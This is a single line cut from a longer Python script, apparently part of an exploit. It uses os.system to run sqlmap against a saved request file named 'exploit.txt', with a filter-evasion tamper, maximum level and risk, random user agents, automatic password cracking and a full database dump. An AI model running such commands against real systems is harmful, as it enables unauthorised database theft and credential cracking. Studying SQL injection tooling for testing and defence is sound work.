...
os.system('python Y:\\Path_to_your_sqlmap-nu11secur1ty\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt -p '+param_spec+' --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
